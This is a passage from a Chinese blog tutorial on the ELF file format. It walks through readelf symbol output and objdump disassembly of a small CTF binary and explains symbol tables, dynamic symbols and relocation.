LOCAL DEFAULT 19 .init_array 20: 0000000000600e18 0 SECTION LOCAL DEFAULT 20 .fini_array 21: 0000000000600e20 0 SECTION LOCAL DEFAULT 21 .jcr 22: 0000000000600e28 0 SECTION LOCAL DEFAULT 22 .dynamic 23: 0000000000600ff8 0 SECTION LOCAL DEFAULT 23 .got 24: 0000000000601000 0 SECTION LOCAL DEFAULT 24 .got.plt 25: 0000000000601038 0 SECTION LOCAL DEFAULT 25 .data 26: 0000000000601050 0 SECTION LOCAL DEFAULT 26 .bss 27: 0000000000000000 0 SECTION LOCAL DEFAULT 27 .comment 28: 0000000000000000 0 FILE LOCAL DEFAULT ABS crtstuff.c 29: 0000000000600e20 0 OBJECT LOCAL DEFAULT 21 __JCR_LIST__ 30: 0000000000400510 0 FUNC LOCAL DEFAULT 14 deregister_tm_clones 31: 0000000000400550 0 FUNC LOCAL DEFAULT 14 register_tm_clones 32: 0000000000400590 0 FUNC LOCAL DEFAULT 14 __do_global_dtors_aux 33: 0000000000601050 1 OBJECT LOCAL DEFAULT 26 completed.7594 34: 0000000000600e18 0 OBJECT LOCAL DEFAULT 20 __do_global_dtor[...] 35: 00000000004005b0 0 FUNC LOCAL DEFAULT 14 frame_dummy 36: 0000000000600e10 0 OBJECT LOCAL DEFAULT 19 __frame_dummy_in[...] 37: 0000000000000000 0 FILE LOCAL DEFAULT ABS babyrop.c 38: 0000000000000000 0 FILE LOCAL DEFAULT ABS crtstuff.c 39: 0000000000400810 0 OBJECT LOCAL DEFAULT 18 __FRAME_END__ 40: 0000000000600e20 0 OBJECT LOCAL DEFAULT 21 __JCR_END__ 41: 0000000000000000 0 FILE LOCAL DEFAULT ABS 42: 0000000000600e18 0 NOTYPE LOCAL DEFAULT 19 __init_array_end 43: 0000000000600e28 0 OBJECT LOCAL DEFAULT 22 _DYNAMIC 44: 0000000000600e10 0 NOTYPE LOCAL DEFAULT 19 __init_array_start 45: 00000000004006e8 0 NOTYPE LOCAL DEFAULT 17 __GNU_EH_FRAME_HDR 46: 0000000000601000 0 OBJECT LOCAL DEFAULT 24 _GLOBAL_OFFSET_TABLE_ 47: 0000000000400690 2 FUNC GLOBAL DEFAULT 14 __libc_csu_fini 48: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterT[...] 49: 0000000000601038 0 NOTYPE WEAK DEFAULT 25 data_start 50: 0000000000601050 0 NOTYPE GLOBAL DEFAULT 25 _edata 51: 0000000000400694 0 FUNC GLOBAL DEFAULT 15 _fini 52: 0000000000000000 0 FUNC GLOBAL DEFAULT UND system@@GLIBC_2.2.5 53: 0000000000000000 0 FUNC GLOBAL DEFAULT UND printf@@GLIBC_2.2.5 54: 0000000000601048 8 OBJECT GLOBAL DEFAULT 25 binsh 55: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_mai[...] 56: 0000000000601038 0 NOTYPE GLOBAL DEFAULT 25 __data_start 57: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 58: 0000000000601040 0 OBJECT GLOBAL HIDDEN 25 __dso_handle 59: 00000000004006a0 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used 60: 0000000000400620 101 FUNC GLOBAL DEFAULT 14 __libc_csu_init 61: 0000000000601058 0 NOTYPE GLOBAL DEFAULT 26 _end 62: 00000000004004e0 42 FUNC GLOBAL DEFAULT 14 _start 63: 0000000000601050 0 NOTYPE GLOBAL DEFAULT 26 __bss_start 64: 00000000004005d6 69 FUNC GLOBAL DEFAULT 14 main 65: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _Jv_RegisterClasses 66: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __isoc99_scanf@@[...] 67: 0000000000601050 0 OBJECT GLOBAL HIDDEN 25 __TMC_END__ 68: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMC[...] 69: 0000000000400460 0 FUNC GLOBAL DEFAULT 11 _init 我们可以看到.symtab节中保存了节、数据对象、包括main在内的函数等，这些对我们的调试、反汇编都是非常重要的。\n当我们使用objdump时，每一段代码前面会有一个标注，如下：\n$ objdump -d babyrop babyrop： 文件格式 elf64-x86-64 Disassembly of section .init: 0000000000400460 \u0026lt;_init\u0026gt;: 400460: 48 83 ec 08 sub $0x8,%rsp 400464: 48 8b 05 8d 0b 20 00 mov 0x200b8d(%rip),%rax # 600ff8 \u0026lt;__gmon_start__\u0026gt; 40046b: 48 85 c0 test %rax,%rax 40046e: 74 05 je 400475 \u0026lt;_init+0x15\u0026gt; 400470: e8 5b 00 00 00 call 4004d0 \u0026lt;__gmon_start__@plt\u0026gt; 400475: 48 83 c4 08 add $0x8,%rsp 400479: c3 ret ... 过程入口是每个函数的起点，因此通过检测过程序言（procedure prologue）可以帮助我们找到一个新韩淑的起始位置\n如果段是公司中不同的部门，节就是部门中的各小组，而符号表就是一张登记表，把各小组及其成员都登记在表上，如果没有符号表，老板就不知道谁是谁了\n.symtab节 保存了符号信息，用于调试和链接，保存了可执行文件的本地符号（全局变量、本地函数等）\n.symtab中保存了所有的符号，有很多都是很重要的，如果把他们去掉，虽然严格意义上不会妨碍程序的运行，但是对人来说就难读了很多\n.strtab节 保存了符号字符串表，该内容会被.symtab结构引用\n.dynsym节 dynsym，dynamic symbols，保存了从共享库导入的动态符号信息，保存在text段中\n它是 .symtab的子集，它只保存动态/全局符号\n与symtab不同的是，动态链接的二进制文件运行时不能缺少它；symtab可以删掉但它不能。但是如果是静态链接程序，用strip命令清理后就不会有符号表（dynsym也变成非必需的了）\n.dynstr节 保存了动态符号字符串表，就是动态符号的名字\n.rel.*节 rel-\u0026gt;reacation，重定位节，保存了重定位相关的信息，这些信息描述了如何在链接或运行过程中对部分内容或进程镜像进行补充或修改\n.hash节 保存了一个用于查找符号的哈希表（散列表）\n.shstrtab节 保存了节头字符串表，也就是每个节头的名字\nELF重定位 Relocation 重定位就是将符号定义和符号引用进行连接的过程。\n在重定位文件中，重定位记录保存了如何对给定的符号对应代码进行补充的相关信息，实际上是一种给二进制文件打补丁的机制。\n例如，1.o的代码中引用了2.o中的代码，当链接的时候就会对1.o中的重定位记录进行分析，目标文件中的代码会被重定位到可执行文件的段中一个给定的地址，符号引用被解析成了符号定义。\n对于共享库的函数，由于延迟链接，只有当一个函数真正被调用时，才会进行GOT重定位\n基于二进制修补的重定位代码注入 既然重定位是将符号引用实现的过程，那么我们可以更改可执行文件的符号表，让其指向我们给定的目标文件让其重定位，这样我们的代码就变成了可执行文件的一部分\n更多的资料敬请阅读Linux ELF 手册\n","date":"2022年10月26日","permalink":"https://peterliuzhi.top/principle/elf%E8%AF%A6%E8%A7%A3/","section":"principle","summary":"Myths which are believed in tend to become true. — George Orwell ELF详解 什么是ELF 使用readelf命令读取elf文件 ELF文件类型 ELF程序头（描述段的头） PT_LOAD PT_DYNAMIC（动态","tags":["pwn","ELF"],"title":"ELF详解"}]